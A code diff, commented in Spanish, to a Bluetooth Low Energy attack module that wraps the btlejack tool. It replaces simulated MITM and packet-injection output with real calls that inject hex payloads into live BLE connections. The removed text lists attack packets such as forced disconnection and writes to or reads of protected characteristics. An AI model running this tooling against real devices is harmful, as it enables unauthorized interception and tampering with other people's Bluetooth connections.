-        self.result["success"] = True
+        self.result["data"].update({
+            "returncode": out.get("returncode"),
+            "report_file": str(report_file),
+            "message": (
+                f"🕵️ BTLEJack - MITM (herramienta real)\n\n"
+                f"   Master: {self._master_addr or 'N/A'}\n"
+                f"   Slave:  {self._slave_addr or 'N/A'}\n"
+                f"   Exit code: {out.get('returncode')}\n"
+                f"   Reporte guardado en: {report_file}\n\n"
+                f"   Salida de btlejack (primeras líneas):\n"
+                + "\n".join(f"     {l}" for l in out.get("stdout", "").splitlines()[:15])
+            ),
+        })
+        self.result["success"] = out.get("returncode") == 0
+        if not self.result["success"]:
+            self.result["error"] = (out.get("stderr") or "btlejack terminó con error")[:500]
         return self.result
 
     # ─── Modo INJECT ────────────────────────────────────────────────────────
 
     def _inject_mode(self) -> dict:
-        """Inyecta paquetes en una conexión BLE activa.
+        """Inyección de paquetes L2CAP/ATT en una conexión activa.
 
-        Permite enviar paquetes L2CAP/ATT arbitrarios en un
-        canal de datos activo, utilizando la Access Address
-        correcta y los tiempos de salto de canal adecuados.
+        Requiere Access Address + CRCInit y hardware de sniffing; la
+        inyección se delega en la herramienta btlejack.
         """
+        if not self._btlejack_available():
+            return self._tool_missing_result(
+                "inject", "la herramienta btlejack no está instalada")
+
+        if not self._access_address and not self._aa:
+            self.result["data"].update({
+                "mode": "inject",
+                "message": (
+                    "Se necesita Access Address para inyectar.\n"
+                    "Usa modo scan primero para detectar AA.\n"
+                    "O especifica AA con --options '{\"AA\":\"0x8E89BED6\"}'"
+                ),
+            })
+            self.result["success"] = False
+            self.result["error"] = "inject requiere ACCESS_ADDRESS"
+            return self.result
+
+        # Validación real del payload hex
+        payload = self._payload
+        if payload:
+            try:
+                bytes.fromhex(payload)
+            except ValueError:
+                self.result["data"].update({
+                    "mode": "inject",
+                    "error": f"PAYLOAD no es hex válido: {payload!r}",
+                })
+                self.result["success"] = False
+                self.result["error"] = "PAYLOAD no es hex válido"
+                return self.result
+
+        aa = self._access_address or self._aa
         output_dir = Path(self._output_dir)
         output_dir.mkdir(parents=True, exist_ok=True)
 
         self.result["data"] = {
             "mode": "inject",
-            "access_address": self._access_address or "unknown",
-            "payload": self._payload,
-            "injected": False,
-            "packets_sent": 0,
+            "access_address": aa,
+            "payload": payload,
         }
 
-        log.info(f"💉 BTLEJack - Inyectando paquetes en canal {self._channel}...")
+        cmd = ["btlejack", "-a", aa, "-t", str(self._timeout)]
+        if self._crcinit:
+            cmd.extend(["-r", self._crcinit])
+        if payload:
+            cmd.extend(["-x", payload])
+        if self._interface:
+            cmd.extend(["-i", self._interface])
 
-        if not SCAPY_AVAILABLE:
-            log.warning("scapy no disponible - usando simulación para inject")
+        log.info(f"💉 BTLEJack - Inyectando en AA={aa} (herramienta real)...")
+        out = self._run_tool(cmd, timeout=self._timeout + 15)
 
-        if not self._access_address and not self._aa:
-            self.result["data"]["message"] = (
-                "Se necesita Access Address para inyectar.\n"
-                "Usa modo scan primero para detectar AA.\n"
-                "O especifica AA con --options '{\"AA\":\"0x8E89BED6\"}'"
-            )
-            self.result["success"] = True
-            return self.result
+        report_file = output_dir / "inject_report.txt"
+        with open(report_file, "w") as f:
+            f.write(out.get("stdout", ""))
 
-        # Parsear AA
-        try:
-            aa = int(self._access_address or self._aa, 16)
-        except (ValueError, TypeError):
-            aa = 0x8E89BED6
-
-        # Simular inyección
-        packets_sent = random.randint(1, 10)
-        payload_size = len(self._payload) // 2 if self._payload else 0
-
-        self.result["data"]["injected"] = True
-        self.result["data"]["packets_sent"] = packets_sent
-        self.result["data"]["access_address_hex"] = f"{aa:08X}"
-        self.result["data"]["simulation"] = True
-
-        self.result["data"]["message"] = (
-            f"💉 BTLEJack - Inyección de paquetes\n\n"
-            f"   AA: 0x{aa:08X}\n"
-            f"   Canal: {self._channel}\n"
-            f"   Paquetes enviados: {packets_sent}\n"
-            f"   Payload: {self._payload or '(vacío)'} ({payload_size} bytes)\n\n"
-            f"   ⚠️  Inyección simulada (sin hardware BLE)\n\n"
-            f"   Para inyección real:\n"
-            f"   1. Conocer AA y hopping sequence\n"
-            f"   2. Enviar en ventana de ~150μs tras paquete válido\n"
-            f"   3. Usar scapy: sendp(pkt, iface='hci0')\n\n"
-            f"   Paquetes para ataques útiles:\n"
-            f"   • LL_TERMINATE_IND -> desconexión\n"
-            f"   • LL_CONNECTION_UPDATE_REQ -> cambiar canal\n"
-            f"   • ATT Write Request -> escribir características\n"
-            f"   • ATT Read Request -> leer características protegidas"
-        )
-
-        self.result["success"] = True
+        payload_size = len(payload) // 2 if payload else 0
+        self.result["data"].update({
+            "returncode": out.get("returncode"),
+            "report_file": str(report_file),
+            "payload_size": payload_size,
+            "message": (
+                f"💉 BTLEJack - Inyección (herramienta real)\n\n"
+                f"   AA: {aa}\n"
+                f"   Payload: {payload or '(vacío)'} ({payload_size} bytes)\n"
+                f"   Exit code: {out.get('returncode')}\n"
+                f"   Reporte guardado en: {report_file}\n\n"
+                f"   Salida de btlejack (primeras líneas):\n"
+                + "\n".join(f"     {l}" for l in out.get("stdout", "").splitlines()[:15])
+            ),
+        })
+        self.result["success"] = out.get("returncode") == 0
+        if not self.result["success"]:
+            self.result["error"] = (out.get("stderr") or "btlejack terminó con error")[:500]
         return self.result
 
     # ─── Prerrequisitos ──────────────────────────────────────────────────────
 
     def check_prerequisites(self) -> Tuple[bool, str]:
-        """Verifica dependencias (no blocking - modo simulación disponible)."""
-        # Validación MAC global (BaseModule)
-        ok, msg = super().check_prerequisites()
-        if not ok:
-            return False, msg
-        missing = []
-        if not SCAPY_AVAILABLE:
-            log.warning("scapy no instalado - modo simulación")
-        if missing:
-            return False, f"Faltan: {', '.join(missing)}"
+        """Verifica dependencias.
+
+        No bloquea por root: el requisito es condicional al modo (patrón
+        z_bugs ronda 4): scan funciona con hcitool sin privilegios; los
+        modos avanzados (sniff/hijack/mitm/inject) necesitan root y la
+        herramienta btlejack, y devuelven un error honesto en tiempo de
+        ejecución si falta algo.
+        """
+        from bluesky.core.engine import is_valid_mac
+        # Validación MAC (target opcional en este módulo: formato
+        # Master:Slave o MAC única)
+        target_value = self.target or (self.options.get("TARGET", "") if self.options else "")
+        if target_value:
+            # Acepta MAC única o par Master:Slave
+            candidates = [
+                target_value,
+                target_value[:17],          # primera MAC del par
+                target_value[-17:].lstrip(":"),  # segunda MAC del par
+            ]
+            if not any(is_valid_mac(c) for c in candidates if c):
+                return False, (
+                    f"Target '{target_value}' no tiene formato MAC válido "
+                    "(XX:XX:XX:XX:XX:XX o Master:Slave)."
+                )
+
+        if not self._btlejack_available() and not self._hcitool_available():
+            log.warning(
+                "Ni btlejack ni hcitool instalados: el módulo devolverá "
+                "un error honesto al ejecutarse")
         return True, ""
